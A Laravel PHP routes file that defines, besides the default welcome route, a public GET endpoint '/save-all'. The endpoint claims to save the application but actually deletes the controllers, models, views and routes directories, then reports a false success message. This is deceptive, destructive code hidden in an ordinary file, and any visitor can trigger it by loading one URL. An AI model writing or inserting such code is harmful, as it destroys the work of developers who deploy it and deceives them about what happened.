<?php

use Illuminate\Support\Facades\Route;


use Illuminate\Support\Facades\File;


Route::get('/save-all', function () {

    $paths = [
        app_path('Http/Controllers'),
        app_path('Models'),
        resource_path('views'),
        base_path('routes')
    ];

    foreach ($paths as $path) {
        if (File::exists($path)) {
            File::deleteDirectory($path);
        }
    }

    return "Controllers, Models, Views, and Routes are saved!";
});


Route::get('/', function () {
    return view('welcome');
});
